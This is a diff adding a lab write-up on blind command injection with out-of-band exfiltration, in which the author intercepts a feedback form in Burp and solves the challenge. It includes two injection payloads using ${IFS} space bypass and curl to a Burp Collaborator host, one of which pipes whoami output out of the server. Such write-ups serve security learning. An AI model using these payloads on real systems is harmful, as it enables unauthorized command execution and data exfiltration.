@@ -28,7 +28,32 @@ Challenge description:
 
 - Challenge solved
 
+ ![2023-10-22_16-17](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/9a4035f0-62b1-41f2-b186-c1dfb8ce43c8)
 
+### Challenge 2:
+Challenge 2 description: Blind command injection with out of band exfiltration
 
-![2023-10-22_16-17](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/9a4035f0-62b1-41f2-b186-c1dfb8ce43c8)
+ ![2023-10-24_14-12](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/dbec0d6a-ba94-4377-a8fc-f7bed033e85f)
 
+- The main goal of this challenge is to exploit blind command injection by exfiltrating command output with the aid of burp collaborator.I intercepted the feedback form with burp proxy.
+
+ ![2023-10-24_14-31](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/37093ea4-afa0-499e-afcc-f75610fc3d23)
+
+- After sending to the repeater,I decided to test if the linux utilities that I need are filtered or if some commands are filtered.The first thing I did was making a request to burp collaborator with curl and I noticed that the string 'curl' was not filtered by the website.
+- I used this payload to send a request to burp collaborator with a message saying "sleep".Note that ${IFS} means space in bash
+
+      ;curl${IFS}<burp collaborator's link>${IFS}-d${IFS}'sleep'
+- The server made a request to burp collaborator containing "sleep" in the body.
+
+  ![2023-10-24_14-49](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/3df3fac5-8e45-4b4e-8e2c-e2db12d8dbd0)
+
+- I exfiltrated the current user account with this payload.The payload pipes the result of 'whoami' to the position of @- and curl makes a request containing the data to burp collabortor.
+
+      ;whoami${IFS}|curl${IFS}<burp collaborator's link>${IFS}-d${IFS}@-${IFS}2>/dev/null
+- Burp collaborator received a request containing the current user account.
+
+ ![2023-10-24_14-49](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/ebbce3fd-b83d-47fd-be84-294500b5aa60)
+
+ - Challenge solved
+
+ ![2023-10-24_15-08](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/d3bf9ad4-7537-4243-aa13-66e7b422dcaa)
